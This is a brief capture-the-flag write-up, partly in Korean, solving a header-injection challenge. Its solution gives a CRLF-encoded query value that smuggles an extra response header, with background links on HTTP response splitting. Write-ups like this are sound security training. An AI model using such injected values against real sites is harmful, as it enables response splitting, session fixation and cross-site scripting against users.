# 52

## Problem
```
HEADER INJECTION
헤더생성
클리어 조건

id: $_GET[id]
clear: r4k4

$_GET[id]로 헤더인젝션을 해서 id=r4k4 쿠키를 생성하세요.

```

## Background Knowledge
* [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')](https://cwe.mitre.org/data/definitions/113.html)
* [HTTP Header Injection - GracefulSecurity](https://www.gracefulsecurity.com/http-header-injection/)
    - CR(Carriage-Return)과 LF(Line-Feed) 글자가 들어간 response가 response header에 나타나도록 할 수 있다면 뭔하는 헤더를 삽입할 수 있다.
    - Header Injection can allow for attacks such as response splitting, session fixation, cross-site scripting, and malicious redirection.

## Solution
* `?id=r4k4%0d%0aclear:%20r4k4%0d%0a`

## Review
* `id=r4k4` 쿠키를 생성하라길래 `Set-Cookie:`를 사용했는데 통과가 안되었다.
* 검색 결과 그냥 클리어 조건대로 `clear: r4k4`를 넣어야 한다.